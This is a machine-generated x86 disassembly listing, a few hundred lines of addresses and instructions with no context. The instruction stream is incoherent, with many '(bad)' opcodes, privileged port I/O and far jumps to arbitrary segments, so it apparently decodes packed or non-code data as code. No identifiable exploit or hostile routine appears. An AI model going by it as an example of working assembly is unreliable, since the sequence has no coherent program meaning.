  416d8c:	pop    eax
  416d8d:	in     eax,0x6e
  416d8f:	mov    ds:0x89ef82c7,al
  416d94:	dec    esi
  416d95:	clc    
  416d96:	jb     0x416dd8
  416d98:	loopne 0x416d79
  416d9a:	test   DWORD PTR [edx-0xe],0x71a807fb
  416da1:	xor    ecx,DWORD PTR [eax]
  416da3:	add    BYTE PTR [ebx+ebx*4-0x5ed11cd0],bl
  416daa:	push   eax
  416dab:	and    dl,bl
  416dad:	fldenv [edx+esi*8-0xae22fec]
  416db4:	push   0x20
  416db6:	mov    ds:0x2e889877,eax
  416dbb:	std    
  416dbc:	clc    
  416dbd:	or     dh,BYTE PTR [esp+ebx*1+0x1c]
  416dc1:	repnz hlt 
  416dc3:	das    
  416dc4:	adc    eax,0x8c30f772
  416dc9:	scas   eax,DWORD PTR es:[edi]
  416dca:	retf   
  416dcb:	sbb    al,0x58
  416dcd:	pop    ss
  416dce:	inc    esi
  416dcf:	dec    ebp
  416dd0:	retf   
  416dd1:	lods   eax,DWORD PTR ds:[esi]
  416dd2:	sub    DWORD PTR [esi],esi
  416dd4:	ffree  st(0)
  416dd6:	adc    DWORD PTR [edi+0x39],0x2b
  416dda:	(bad)  
  416ddb:	or     al,0x38
  416ddd:	sahf   
  416dde:	loope  0x416da4
  416de0:	sub    cl,BYTE PTR [ecx]
  416de2:	add    ebp,DWORD PTR [ebx+esi*2-0x2e]
  416de6:	aad    0x2d
  416de8:	mov    bh,0x3
  416dea:	jecxz  0x416e3f
  416dec:	or     ebp,DWORD PTR [edx-0xaaad742]
  416df2:	jmp    0xd1a2:0x89e59940
  416df9:	jb     0x416de4
  416dfb:	xchg   esp,eax
  416dfc:	push   ecx
  416dfd:	not    BYTE PTR [eax+0x54d6f887]
  416e03:	sti    
  416e04:	iret   
  416e05:	sub    al,0x2e
  416e07:	or     esi,ebx
  416e09:	xchg   edx,eax
  416e0a:	fldenv [ebx+edi*2]
  416e0d:	retf   
  416e0e:	sbb    esi,DWORD PTR [edi]
  416e10:	mov    ah,0xf9
  416e12:	add    ax,0x8362
  416e16:	mov    DWORD PTR [esi],esi
  416e18:	fs pop esi
  416e1a:	jle    0x416e3e
  416e1c:	cmc    
  416e1d:	jne    0x416dce
  416e1f:	adc    eax,0x24f48c6f
  416e24:	repnz adc al,BYTE PTR [ecx]
  416e27:	jle    0x416e86
  416e29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e2a:	sub    DWORD PTR [edx],eax
  416e2c:	jne    0x416df9
  416e2e:	push   edx
  416e2f:	fcmovne st,st(1)
  416e31:	pusha  
  416e32:	das    
  416e33:	cmp    al,0x3d
  416e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e36:	retf   
  416e37:	popf   
  416e38:	sti    
  416e39:	mov    WORD PTR [eax-0x2e0e5b85],?
  416e3f:	jmp    0x416e3d
  416e41:	cli    
  416e42:	scas   eax,DWORD PTR es:[edi]
  416e43:	sbb    ch,ah
  416e45:	in     al,0xc5
  416e47:	xor    BYTE PTR [edx-0x1a1d4501],0x63
  416e4e:	add    esp,DWORD PTR [eax+0x26b20855]
  416e54:	js     0x416e39
  416e56:	xchg   ebx,eax
  416e57:	mov    DWORD PTR [esi],esp
  416e59:	(bad)  
  416e5a:	pop    esi
  416e5b:	push   0x14111e0c
  416e60:	mov    ds:0x127af267,eax
  416e65:	pop    edi
  416e66:	and    dl,ch
  416e68:	xor    eax,0xc911711d
  416e6d:	(bad)  
  416e6f:	dec    edi
  416e70:	mov    bl,0x13
  416e72:	scas   al,BYTE PTR es:[edi]
  416e73:	into   
  416e74:	add    BYTE PTR [edi-0x4e],dl
  416e77:	fs mov ebx,0xdb54fda1
  416e7d:	jmp    0x416e66
  416e7f:	cld    
  416e80:	mov    dh,0xf2
  416e82:	cli    
  416e83:	sub    dl,bl
  416e85:	dec    DWORD PTR [edx-0x3e]
  416e88:	test   eax,0x568eea43
  416e8d:	test   DWORD PTR [ecx],ecx
  416e8f:	test   BYTE PTR [edx+0x3c10919e],ah
  416e95:	(bad)  
  416e96:	or     eax,DWORD PTR [edi+0x1f]
  416e99:	ss scas al,BYTE PTR es:[edi]
  416e9b:	jle    0x416e53
  416e9d:	mov    edi,0xc8740fcb
  416ea2:	cmp    eax,0xf9eaef21
  416ea7:	ltr    cx
  416eaa:	test   esp,edi
  416eac:	jne    0x416eea
  416eae:	loop   0x416edd
  416eb0:	jnp    0x416e6f
  416eb2:	push   esp
  416eb3:	xlat   BYTE PTR ds:[ebx]
  416eb4:	or     DWORD PTR [esi+0x5e],ecx
  416eb7:	sbb    eax,0x1aa9edfa
  416ebc:	in     eax,dx
  416ebd:	push   eax
  416ebe:	adc    ebx,esi
  416ec0:	push   ebp
  416ec1:	fidivr DWORD PTR [eax-0x46]
  416ec4:	xor    DWORD PTR ds:0x2fbbcb52,eax
  416eca:	or     al,0x72
  416ecc:	sub    BYTE PTR [edx-0x5f],0xe2
  416ed0:	or     DWORD PTR [bx],0xbc2cf2b9
  416ed7:	pop    ebx
  416ed8:	mov    BYTE PTR [ecx+ecx*2-0x4d9bda34],bl
  416edf:	(bad)  [ebp-0x1ff2a823]
  416ee5:	iret   
  416ee6:	imul   ecx,DWORD PTR [edi+0x29],0x16d8d5ed
  416eed:	xchg   BYTE PTR [esi+0x77163789],bl
  416ef3:	rcr    DWORD PTR [edx+0x25df9d29],1
  416ef9:	push   esp
  416efa:	pop    ecx
  416efb:	iret   
  416efc:	add    al,0xd
  416efe:	adc    eax,0x840aaa42
  416f03:	xchg   edx,eax
  416f04:	xchg   al,dl
  416f06:	imul   ecx,DWORD PTR ss:[ebx],0x22
  416f0a:	je     0x416f7a
  416f0c:	push   eax
  416f0d:	scas   eax,DWORD PTR es:[edi]
  416f0e:	test   al,0x8c
  416f10:	jg     0x416f58
  416f12:	mov    edx,0x237486ae
  416f17:	inc    esp
  416f18:	jo     0x416f56
  416f1a:	xchg   ebp,eax
  416f1b:	jbe    0x416f28
  416f1d:	jns    0x416ed4
  416f1f:	dec    edx
  416f20:	and    DWORD PTR [edi-0x153e7593],ecx
  416f26:	push   es
  416f27:	mov    bh,0x4d
  416f29:	or     WORD PTR [esi+0x542736b5],ax
  416f30:	xabort 0x73
  416f33:	sahf   
  416f34:	add    ebp,DWORD PTR [eax+0x686480ec]
  416f3a:	mov    ds:0x42754555,al
  416f3f:	sub    eax,0x7da23b9b
  416f44:	mov    edx,0x1393e7ec
  416f49:	lods   eax,DWORD PTR ds:[esi]
  416f4a:	int    0x9
  416f4c:	pop    edi
  416f4d:	int    0x0
  416f4f:	idiv   DWORD PTR [ebp+0x1a84802d]
  416f55:	ins    DWORD PTR es:[edi],dx
  416f56:	dec    ebx
  416f57:	mov    cl,ah
  416f59:	enter  0xa104,0x33
  416f5d:	push   0x306f0d9b
  416f62:	call   0x5eb1:0x41adaeae
  416f69:	shr    DWORD PTR [bx+di+0x7da4],1
  416f6e:	dec    esi
  416f6f:	mov    BYTE PTR [ebx],dh
  416f71:	mov    fs,WORD PTR [esi+0x64ecb2ed]
  416f77:	outs   dx,DWORD PTR ds:[esi]
  416f78:	and    BYTE PTR [ecx],ah
  416f7a:	and    DWORD PTR [eax+0x73],0x5a
  416f7e:	cs inc edx
  416f80:	repz out dx,al
  416f82:	fistp  QWORD PTR [ebx-0x9144432]
  416f88:	sub    eax,DWORD PTR [eax-0x7]
  416f8b:	dec    edx
  416f8c:	mov    DWORD PTR [eax],0xb1cdd15c
  416f92:	jmp    0xf9c1:0x9184736c
  416f99:	xor    eax,DWORD PTR [edx]
  416f9b:	mov    cl,0xe6
  416f9d:	adc    eax,0xd06eb7
  416fa2:	mov    dh,0xe7
  416fa4:	xchg   esi,eax
  416fa5:	fnstcw WORD PTR [eax+0x20ebf848]
  416fab:	xchg   ebp,eax
  416fac:	popf   
  416fad:	imul   eax,DWORD PTR [edx+edi*1],0xffffffa2
  416fb1:	push   cs
  416fb2:	es adc bl,bh
  416fb5:	jecxz  0x416f46
  416fb7:	jmp    0x9745:0x657c3f31
  416fbe:	test   eax,0xb90ce917
  416fc3:	cld    
  416fc4:	call   0x9aca:0xf401665
  416fcb:	mov    al,0xc3
  416fcd:	sbb    esi,DWORD PTR ds:0x62725aa
  416fd3:	adc    DWORD PTR [ebp-0x33af2e77],esp
  416fd9:	adc    dl,BYTE PTR [edi]
  416fdb:	mov    cl,0x18
  416fdd:	mov    dh,0xf9
  416fdf:	sbb    edx,esi
  416fe1:	mov    al,0x38
  416fe3:	sbb    BYTE PTR [ecx+edx*1+0x77785cf],bl
  416fea:	sbb    al,0x5d
  416fec:	mov    ebx,DWORD PTR [esi-0x530cae32]
  416ff2:	scas   al,BYTE PTR es:[edi]
  416ff3:	(bad)  [edi]
  416ff5:	les    edx,FWORD PTR [eax+edi*4-0x2f7e7a50]
  416ffc:	out    0x1d,al
  416ffe:	pop    es
  416fff:	mov    ecx,0x8a067208
  417004:	xor    al,0xb7
  417006:	push   edi
  417007:	jmp    0x417034
  417009:	pop    DWORD PTR [ecx+0x6a]
  41700c:	mov    dh,0x40
  41700e:	cld    
  41700f:	stos   DWORD PTR es:[edi],eax
  417010:	xchg   esp,eax
  417011:	xchg   edx,eax
  417012:	stos   BYTE PTR es:[edi],al
  417013:	scas   eax,DWORD PTR es:[edi]
  417014:	or     DWORD PTR ds:0x25c981a9,edx
  41701a:	sar    edx,0x69
  41701d:	lods   al,BYTE PTR ds:[esi]
  41701e:	add    esi,DWORD PTR [eax]
  417020:	xchg   ecx,eax
  417021:	ret    
  417022:	std    
  417023:	mov    ebx,0xd60e559c
  417028:	xor    eax,0x4d79139e
  41702d:	sahf   
  41702e:	outs   dx,BYTE PTR ds:[esi]
  41702f:	adc    BYTE PTR [ebx+0xbb407aa],ah
  417035:	jg     0x416fff
  417037:	(bad)  
  417038:	jbe    0x416fbf
  41703a:	bound  eax,QWORD PTR [eax+0x47]
  41703d:	lock mov cl,BYTE PTR [ecx-0x42]
  417041:	push   cs
  417042:	push   esp
  417043:	rcl    DWORD PTR [edx+esi*1+0x3b],cl
  417047:	sbb    eax,0xfc4f016f
  41704c:	sub    al,0xe6
  41704e:	jnp    0x417085
  417050:	int    0x74
  417052:	pop    ebx
  417053:	or     BYTE PTR [esi+0xb7627c8],0xea
  41705a:	call   0x2ca0:0x2b1cde4
  417061:	xor    edi,DWORD PTR [ecx]
  417063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417064:	imul   ecx,DWORD PTR [ebx+ebp*4+0x3],0xd523379d
  41706c:	push   ebp
  41706d:	jle    0x41707d
  41706f:	leave  
  417070:	adc    dl,BYTE PTR [edx+ebp*4+0x53]
  417074:	sbb    ebp,DWORD PTR [ebp-0x21]
  417077:	push   ds
  417078:	mov    esi,0xadbad274
  41707d:	xchg   ebx,eax
  41707e:	push   0x7e00043a
  417083:	add    edi,DWORD PTR [edx+0x5e]
  417086:	xor    DWORD PTR [edx],edi
  417088:	lahf   
  417089:	mov    ebx,0x3c80c81a
  41708e:	or     al,0x9c
  417090:	push   es
  417091:	or     BYTE PTR [esi+0x66],cl
  417094:	int    0x65
  417096:	xchg   edi,eax
  417097:	xor    al,0x6c
  417099:	mov    ds:0x746b3df0,eax
  41709e:	stos   BYTE PTR es:[edi],al
  41709f:	outs   dx,DWORD PTR ds:[esi]
  4170a0:	cmp    edi,DWORD PTR [edx+0x5a]
  4170a3:	ss stos BYTE PTR es:[edi],al
  4170a5:	xlat   BYTE PTR ds:[ebx]
  4170a6:	jmp    DWORD PTR [edx+eiz*4+0x5f7bb37]
  4170ad:	add    ecx,DWORD PTR [esi+ebx*4+0x10]
  4170b1:	aaa    
  4170b2:	mov    dl,0x6e
  4170b4:	shr    BYTE PTR [edi],cl
  4170b6:	mov    ds:0xbdd026f1,eax
  4170bb:	lea    edx,[ebp+0x63]
  4170be:	push   edi
  4170bf:	pop    edi
  4170c0:	in     eax,0xb2
  4170c2:	jmp    0x417075
  4170c4:	sub    DWORD PTR [ebx-0x1d445b],edx
  4170ca:	mov    DWORD PTR [esi],ebp
  4170cc:	das    
  4170cd:	test   BYTE PTR [edi+0x41],al
  4170d0:	iret   
  4170d1:	daa    
  4170d2:	imul   edi,ebp,0xffffffb7
  4170d5:	push   ss
  4170d6:	aaa    
  4170d7:	jecxz  0x417078
  4170d9:	dec    esi
  4170da:	pop    ecx
  4170db:	dec    edi
  4170dc:	loop   0x417075
  4170de:	sar    BYTE PTR [ebx+0x60],0x12
  4170e2:	sub    eax,0xce82c3d5
  4170e7:	ret    
  4170e8:	push   ebp
  4170e9:	(bad)  
  4170ea:	nop
  4170eb:	sub    cl,BYTE PTR ds:0x8e5513d4
  4170f1:	scas   al,BYTE PTR es:[edi]
  4170f2:	add    BYTE PTR [ecx-0x77ea5f18],0xff
  4170f9:	fcmovb st,st(1)
  4170fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170fc:	sbb    DWORD PTR [edx-0xbeb0b32],ecx
  417102:	es jge 0x4170cc
  417105:	xchg   esi,eax
  417106:	inc    ebp
  417107:	fstp   DWORD PTR [edx+0x28]
  41710a:	iret   
  41710b:	ror    BYTE PTR [ebx-0x3e8db47e],1
  417111:	into   
  417112:	or     eax,0xfa4ef9a9
  417117:	and    ch,BYTE PTR [ebx-0x190f8c06]
  41711d:	inc    edi
  41711e:	in     al,dx
  41711f:	adc    esi,0x69314c66
  417125:	pop    eax
  417126:	xor    al,0x94
  417128:	movq   mm7,QWORD PTR [eax]
  41712b:	leave  
  41712c:	jo     0x4170c7
  41712e:	inc    edx
  41712f:	pop    ebp
  417130:	dec    ebp
  417131:	xchg   ebp,eax
  417132:	jle    0x41712a
  417134:	stos   BYTE PTR es:[edi],al
  417135:	add    eax,edi
  417137:	ret    
  417138:	inc    eax
  417139:	lods   eax,DWORD PTR ds:[esi]
  41713a:	xchg   edx,eax
  41713b:	dec    eax
  41713c:	mov    ebx,ebp
  41713e:	xchg   esp,eax
  41713f:	imul   edi,DWORD PTR [edx+ecx*2+0x49],0x39
  417144:	fs in  al,0xc6
  417147:	retf   
  417148:	mov    ah,0xf9
  41714a:	or     DWORD PTR [ebx+0x3a3256af],eax
  417150:	ficom  WORD PTR [edi+0x13698bf5]
  417156:	(bad)  
  417157:	aas    
  417158:	add    DWORD PTR [ebx+0x6a],ebx
  41715b:	lahf   
  41715c:	sub    ch,BYTE PTR [edi+edi*1+0x66d245df]
  417163:	cmp    eax,0xd3d395ac
  417168:	(bad)  
  417169:	jmp    0x1411323a
  41716e:	cdq    
  41716f:	sti    
  417170:	ficom  DWORD PTR [ecx-0x13]
  417173:	fld    st(1)
  417175:	retf   
  417176:	inc    esi
  417177:	imul   eax,DWORD PTR [edi+0x4d],0x74fa62c7
  41717e:	test   al,0x18
  417180:	arpl   WORD PTR [edx+0xa3eede9],sp
  417186:	out    dx,eax
  417187:	xchg   esp,eax
  417188:	push   ebp
  417189:	lds    ebx,FWORD PTR [esi-0x16]
  41718c:	mov    esi,edi
  41718e:	popf   
  41718f:	xor    al,0x2b
  417191:	fdivr  QWORD PTR [esi+0xa]
  417194:	popa   
  417195:	cmp    DWORD PTR [esp+edx*2],ecx
  417198:	pop    edx
  417199:	cmp    al,0xa4
  41719b:	sar    dh,cl
  41719d:	push   esp
  41719e:	lods   al,BYTE PTR ds:[esi]
  41719f:	repz xor edi,DWORD PTR [edi+0x258ff9da]
  4171a6:	push   0xffffff9c
  4171a8:	shl    BYTE PTR [ecx],cl
  4171aa:	fmul   st(4),st
  4171ac:	adc    ecx,ebp
  4171ae:	or     al,0xc9
  4171b0:	and    DWORD PTR [edi-0x5],ecx
  4171b3:	adc    al,0x7
  4171b5:	and    al,0x1d
  4171b7:	inc    esp
  4171b8:	xchg   DWORD PTR [ebp-0x462a165e],ecx
  4171be:	(bad)  
  4171bf:	div    DWORD PTR [eax-0x27]
  4171c2:	mov    BYTE PTR [ecx-0x7],ch
  4171c5:	imul   DWORD PTR [eax+0x1a]
  4171c8:	ffree  st(3)
  4171ca:	push   0xffffffaa
  4171cc:	pop    edx
  4171cd:	xor    DWORD PTR [edi+0x63],esp
  4171d0:	dec    ebp
  4171d1:	pop    ecx
  4171d2:	ror    DWORD PTR [ebx],cl
  4171d4:	inc    ebx
  4171d5:	setl   BYTE PTR [edx+esi*1-0x78]
  4171da:	xor    dl,cl
  4171dc:	mov    gs,WORD PTR [ecx+0x52]
  4171df:	fsubr  QWORD PTR [ebx]
  4171e1:	jg     0x417182
  4171e3:	mov    ?,WORD PTR [esi+eiz*1+0x22]
  4171e7:	pop    ebx
  4171e8:	adc    eax,0x554f7f42
  4171ed:	call   0x1d68:0x8e41552b
  4171f4:	add    ecx,DWORD PTR [ecx]
  4171f6:	lahf   
  4171f7:	jo     0x417247
  4171f9:	movd   DWORD PTR [eax],mm0
  4171fc:	sub    ecx,DWORD PTR [ebp+0x3c24d624]
  417202:	push   cs
  417203:	fucomp st(5)
  417205:	stos   BYTE PTR es:[edi],al
  417206:	add    ebp,DWORD PTR [edx+eiz*2-0x60]
  41720a:	cdq    
  41720b:	fdiv   DWORD PTR [esi]
  41720d:	gs stc 
  41720f:	lds    ebp,FWORD PTR [edx-0x24]
  417212:	int    0x4f
  417214:	push   ebp
  417215:	imul   edx,DWORD PTR [esi+0x697bef85],0x2a2ed716
  41721f:	stc    
  417220:	ss mov ch,0x20
  417223:	adc    esi,esp
  417225:	sbb    ebx,DWORD PTR [ebp+0x43]
  417228:	loope  0x41725a
  41722a:	add    DWORD PTR [ecx],esi
  41722c:	lods   eax,DWORD PTR ds:[esi]
  41722d:	pop    ebp
  41722e:	in     al,dx
  41722f:	add    bl,BYTE PTR [edx]
  417231:	push   ebp
  417232:	jne    0x4172a5
  417234:	popf   
  417235:	mov    edi,0x1dbf7205
  41723a:	div    DWORD PTR [ebx+ebp*2+0x425b98ac]
  417241:	outs   dx,BYTE PTR ds:[esi]
  417242:	mov    ds:0xca1c1c92,eax
  417247:	xchg   esp,eax
  417248:	add    ebx,DWORD PTR [eax]
  41724a:	xchg   ecx,eax
  41724b:	mov    ebp,0xe0318930
  417250:	scas   eax,DWORD PTR es:[edi]
  417251:	arpl   WORD PTR [ebp+0x4d],ax
  417254:	jle    0x4172a8
  417256:	jp     0x417295
  417258:	daa    
  417259:	mov    ebx,0x36643ba0
  41725e:	in     eax,dx
  41725f:	lock jmp 0x66700534
  417265:	sbb    bl,bl
  417267:	xor    eax,0x48ebf5d5
  41726c:	cmp    DWORD PTR [edi+esi*8],edx
  41726f:	mov    eax,0x12f5af0c
  417274:	xor    al,0x1e
  417277:	fcom   DWORD PTR [ecx]
  417279:	scas   al,BYTE PTR es:[edi]
  41727a:	repnz sub DWORD PTR [eax],esi
  41727d:	jne    0x41724d
  41727f:	jmp    0xf9b1f9fd
  417284:	add    DWORD PTR [esi],esp
  417286:	dec    ecx
  417287:	xchg   bl,al
  417289:	imul   edi,DWORD PTR [edx+0x7e3c689e],0x5682d2de
  417293:	scas   eax,DWORD PTR es:[edi]
  417294:	cmp    BYTE PTR ds:[edx+0xd],al
  417298:	mov    bh,0x3b
  41729a:	stos   DWORD PTR es:[edi],eax
  41729b:	or     ah,BYTE PTR [esp+ebp*1-0x52]
  41729f:	cmp    cl,0x9a
  4172a2:	scas   al,BYTE PTR es:[edi]
  4172a3:	push   cs
  4172a4:	retf   
  4172a5:	sub    DWORD PTR [ebx-0x768ed19f],ecx
  4172ab:	call   DWORD PTR [ebx+0x54617784]
  4172b1:	dec    ecx
  4172b2:	fst    DWORD PTR [eax+0x55b9f79]
  4172b8:	xchg   ecx,eax
  4172b9:	sub    eax,0x4fd5d1aa
  4172be:	(bad)  
  4172c0:	xchg   edi,eax
  4172c1:	jp     0x4172b1
  4172c3:	xchg   ch,dl
  4172c5:	jecxz  0x4172d3
  4172c7:	ins    BYTE PTR es:[edi],dx
  4172c8:	dec    edi
  4172c9:	rcr    DWORD PTR [ecx-0x67],1
  4172cc:	push   edx
  4172cd:	inc    ebx
  4172ce:	jns    0x4172e6
  4172d0:	test   ebp,ecx
  4172d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172d3:	aas    
  4172d4:	jp     0x4172b9
  4172d6:	scas   al,BYTE PTR es:[edi]
  4172d7:	inc    esi
  4172d8:	mov    al,0x5c
  4172da:	inc    ecx
  4172db:	mov    WORD PTR [ebp+0x43e021f0],fs
  4172e1:	imul   ecx,DWORD PTR [edx+0x4c],0x859db1f0
  4172e8:	sti    
  4172e9:	jbe    0x417356
  4172eb:	push   ss
  4172ec:	ret    0x7e11
  4172ef:	sti    
  4172f0:	push   ss
  4172f1:	ins    BYTE PTR es:[edi],dx
  4172f2:	shl    ebx,0x78
  4172f5:	sbb    dl,BYTE PTR [ecx]
  4172f7:	pop    ebp
  4172f8:	fidivr WORD PTR [edi]
  4172fa:	not    eax
  4172fc:	les    edi,FWORD PTR [esi+0x1f]
  4172ff:	push   ecx
  417300:	xchg   esp,eax
  417301:	test   al,0x4a
  417303:	mov    ebx,0x35ba107f
  417308:	pop    es
  417309:	jns    0x417324
  41730b:	mov    esi,0xb5421308
  417310:	cmp    DWORD PTR [esi],ebx
  417312:	popa   
  417313:	in     al,dx
  417314:	cmc    
  417315:	cmp    ecx,ebp
  417317:	mov    edi,0xff45932a
  41731c:	int3   
  41731d:	sar    edi,0x4f
  417320:	mov    ds:0xc6f526f9,al
  417325:	mov    bh,0x5f
  417327:	inc    edx
  417328:	stos   DWORD PTR es:[edi],eax
  417329:	inc    edi
  41732a:	cmp    al,0x3c
  41732c:	push   ebx
  41732d:	xor    al,BYTE PTR [ecx+0x3c]
  417330:	fstp   QWORD PTR [esp+edx*1-0x6d4d8eba]
  417337:	xor    bl,BYTE PTR [esi]
  417339:	(bad)  
  41733a:	aad    0x1c
  41733c:	push   ecx
  41733d:	int3   
  41733e:	js     0x417321
  417340:	cmp    ah,bh
  417342:	mov    ecx,0x59dddceb
  417347:	mov    esp,0x945d88e3
  41734c:	pop    ss
  41734d:	mov    cl,0x97
  41734f:	or     eax,0x2cff16a0
  417354:	mov    dh,0x4c
  417356:	jl     0x417316
  417358:	int    0xac
  41735a:	outs   dx,DWORD PTR ds:[esi]
  41735b:	or     dl,BYTE PTR [ecx+0x5551707f]
  417361:	ins    BYTE PTR es:[edi],dx
  417362:	inc    DWORD PTR [esi]
  417364:	inc    eax
  417365:	gs xor eax,0xa77c6e03
  41736b:	sbb    ch,dl
  41736d:	int    0xc0
  41736f:	rcl    DWORD PTR [ecx],cl
  417371:	xchg   esp,eax
  417372:	jae    0x41731a
  417374:	push   ecx
  417375:	emms   
  417377:	test   esi,ebp
  417379:	sub    bh,0x57
  41737c:	pushf  
  41737d:	xor    al,0x60
  41737f:	addr16 das 
  417381:	dec    edx
  417382:	mov    edi,0x91ab2bb3
  417387:	cmc    
  417388:	das    
  417389:	push   esp
  41738a:	sti    
  41738b:	cwde   
  41738c:	sar    BYTE PTR [ecx-0x4bdadc17],0xbf
  417393:	mov    DWORD PTR [ecx+0x2f],edx
  417396:	inc    esi
  417397:	mov    cl,0xd3
  417399:	inc    edx
  41739a:	push   esp
  41739b:	add    al,0xc2
  41739d:	stos   DWORD PTR es:[edi],eax
  41739e:	retf   
  41739f:	and    ebp,DWORD PTR [edx]
  4173a1:	sahf   
  4173a2:	lea    ecx,[edi-0x10201588]
  4173a8:	cmp    al,dh
  4173aa:	ins    BYTE PTR es:[edi],dx
  4173ab:	loop   0x41734e
  4173ad:	icebp  
  4173ae:	jne    0x417337
  4173b0:	xchg   esi,eax
  4173b1:	lods   al,BYTE PTR ds:[esi]
  4173b2:	lock (bad) 
  4173b4:	jo     0x4173e7
  4173b6:	daa    
  4173b7:	cwde   
  4173b8:	push   edi
  4173b9:	loopne 0x41733e
  4173bb:	cmp    al,0x16
  4173bd:	pop    ds
  4173be:	stos   DWORD PTR es:[edi],eax
  4173bf:	cmp    al,0xbe
  4173c1:	pop    ss
  4173c2:	jae    0x417353
  4173c4:	(bad)
  4173c7:	iret   
  4173c8:	pop    es
  4173c9:	in     al,dx
  4173ca:	sbb    BYTE PTR [ecx],cl
  4173cc:	xchg   esp,esp
  4173ce:	daa    
  4173cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173d0:	(bad)  
  4173d1:	sub    ecx,esi
  4173d3:	mov    ch,0x93
  4173d5:	xor    ch,BYTE PTR [ebx-0x67]
  4173d8:	fwait
  4173d9:	je     0x4173fe
  4173db:	push   ecx
  4173dc:	sbb    ch,BYTE PTR [esp+eiz*8-0x6b]
  4173e0:	jecxz  0x41740b
  4173e2:	dec    esi
  4173e3:	add    bh,BYTE PTR [ecx+edx*2-0x1da07461]
  4173ea:	pop    ds
  4173eb:	aad    0x6
  4173ed:	jno    0x41740c
  4173ef:	ret    
  4173f0:	imul   esp,ebp,0x3d
  4173f3:	sbb    eax,0xf8533a41
  4173f8:	mov    eax,0xc1cae333
  4173fd:	aad    0x13
  4173ff:	pusha  
  417400:	cli    
  417401:	stos   DWORD PTR es:[edi],eax
  417402:	in     al,0x4e
  417404:	dec    edx
  417405:	in     al,dx
  417406:	cmp    eax,DWORD PTR [ecx+edx*1+0x6c]
  41740a:	jne    0x417453
  41740c:	mov    ch,0xf9
  41740e:	mov    ch,0x63
  417410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417411:	int    0xdd
  417413:	out    0x1e,al
  417415:	push   es
  417416:	xor    dl,ch
  417418:	pop    ss
  417419:	in     eax,dx
  41741a:	pop    es
  41741b:	or     eax,0x99fbefb4
  417420:	repz cmp al,0xe7
  417423:	call   FWORD PTR [ebx+ebp*2+0x28c1787e]
  41742a:	nop
  41742b:	retf   
  41742c:	push   ebp
  41742d:	xlat   BYTE PTR ds:[ebx]
  41742e:	std    
  41742f:	push   edi
  417430:	and    al,0x54
  417432:	in     al,0x68
  417434:	mov    eax,ebp
  417436:	cs dec esi
  417438:	mov    ebp,0xbb731138
  41743d:	adc    al,BYTE PTR [ebx+eiz*4-0x10]
  417441:	mov    esp,0x2fdbf43a
  417446:	or     eax,0x45b8a0d6
  41744b:	jb     0x417448
  41744d:	pop    ebx
  41744e:	mov    cl,0xf9
  417451:	retf   
  417452:	push   esp
  417453:	call   0x9e87e132
  417458:	sbb    edx,edi
  41745a:	rcr    BYTE PTR [esi-0x3610301b],cl
  417460:	shl    esp,1
  417462:	jle    0x4173ef
  417464:	das    
  417465:	sub    BYTE PTR [ecx],0xb9
  417468:	pushf  
  417469:	(bad)  
  41746b:	dec    esi
  41746c:	leave  
  41746d:	sbb    cl,dh
  41746f:	ret    0xd2e1
  417472:	jns    0x4174ca
  417474:	sbb    al,BYTE PTR [ecx+eiz*1]
  417477:	or     edi,DWORD PTR [esi+0x69d9ee30]
  41747d:	(bad)  [eax+0x6b]
  417480:	in     al,dx
  417481:	dec    edx
  417482:	mov    bl,0x9b
  417484:	mov    esp,0xa973dd24
  417489:	iret   
  41748a:	shr    edi,1
  41748c:	and    BYTE PTR [eax-0x6cdc6058],0x81
  417493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417494:	lds    edx,FWORD PTR [edi+0xa]
  417497:	in     al,0x41
  417499:	cmp    BYTE PTR [eax+0x53],0x83
  41749d:	sbb    al,0x58
  41749f:	dec    edx
  4174a0:	(bad)  
  4174a1:	fs add al,0x54
  4174a4:	popa   
  4174a5:	push   edx
  4174a6:	add    al,0x37
  4174a8:	pop    ss
  4174a9:	push   esi
  4174aa:	mov    bh,0x37
  4174ac:	pop    ebx
  4174ad:	in     eax,0x64
  4174af:	dec    ebx
  4174b0:	adc    dl,ah
  4174b2:	xor    BYTE PTR [edi+0x329556d2],bl
  4174b8:	or     al,0x98
  4174ba:	mov    ebp,fs
  4174bc:	xor    ch,bl
  4174be:	dec    edi
  4174bf:	into   
  4174c0:	ss popf 
  4174c2:	sub    dl,0x32
  4174c5:	and    dh,al
  4174c7:	repnz cmp al,0xa8
  4174ca:	adc    ecx,edx
  4174cc:	push   cs
  4174cd:	mov    bl,0x5
  4174cf:	push   eax
  4174d0:	or     al,0x9a
  4174d2:	sbb    dh,dh
  4174d4:	gs rcr eax,cl
  4174d7:	push   ecx
  4174d8:	inc    eax
  4174d9:	cmp    DWORD PTR [ebx+0x51980c31],edi
  4174df:	xor    ebp,0xf6e11654
  4174e5:	cmp    eax,DWORD PTR [eax+eiz*4-0x4f7cca94]
  4174ec:	mov    dl,0xdc
  4174ee:	cmp    eax,0x46fedc4d
  4174f3:	cmp    BYTE PTR [ebx],ah
  4174f5:	sub    bh,ah
  4174f7:	es push esi
  4174f9:	pop    ecx
  4174fa:	pop    ds
  4174fb:	imul   ecx,DWORD PTR [ebx],0x43
  4174fe:	xchg   esi,eax
  4174ff:	and    BYTE PTR [edi],al
  417501:	out    dx,al
  417502:	adc    cl,al
  417504:	mov    ebp,DWORD PTR [ebx]
  417506:	stos   BYTE PTR es:[edi],al
  417507:	daa    
  417508:	std    
  417509:	push   DWORD PTR [eax+ebx*1]
  41750c:	not    DWORD PTR [ebx-0xf8eeca4]
  417512:	sbb    al,0x56
  417514:	mov    DWORD PTR [esi],edi
  417516:	sub    al,0xf
  417518:	sub    bh,bl
  41751a:	xor    dh,ch
  41751c:	inc    edx
  41751d:	in     al,dx
  41751e:	inc    ebp
  41751f:	cld    
  417520:	data16 mov ch,0xd9
  417523:	xchg   ebx,eax
  417524:	sbb    ah,dh
  417526:	sahf   
  417527:	loope  0x4174b0
  417529:	hlt    
  41752a:	mov    edi,0xb04c0490
  41752f:	xchg   esp,eax
  417530:	clc    
  417531:	inc    eax
  417532:	sub    BYTE PTR [esi],dl
  417534:	popf   
